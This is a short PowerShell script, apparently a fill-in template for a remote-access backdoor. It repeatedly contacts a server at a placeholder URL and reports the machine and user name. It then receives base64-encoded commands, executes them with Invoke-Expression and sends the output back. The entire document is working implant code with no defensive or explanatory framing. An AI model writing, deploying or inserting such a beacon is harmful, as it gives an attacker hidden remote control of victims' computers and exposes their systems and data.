
$url = "{{url}}" 
$thold = {{delta}};

while (1){
    sleep $thold;
    Try {
        $q= Invoke-RestMethod -Uri ($url + "run") -Method Post -Body $(@{ "hostname" = "$env:COMPUTERNAME" + "-$Env:UserName"} | ConvertTo-Json) -ContentType "application/json"
        $thold = $q.delta;
        $cmd = $q.currentcmd;       
        Try {
            $a = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd))
            if ($a -eq "hold") { continue; }
            $cmdO = Invoke-Expression $a;   
            $cmdOutput = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($cmdO))
            $q= Invoke-RestMethod -Uri ($url + "out") -Method Post -Body $(@{ "hostname" = "$env:COMPUTERNAME" + "-$Env:UserName"; "out"= $cmdOutput} | ConvertTo-Json) -ContentType "application/json" 
        } catch {
            $q= Invoke-RestMethod -Uri ($url + "out") -Method Post -Body $(@{ "hostname" = "$env:COMPUTERNAME" + "-$Env:UserName"; "out"= "error cmd"} | ConvertTo-Json) -ContentType "application/json"    
        }
        
    } Catch {
        echo "cant establish conn :)";  
    }   
}

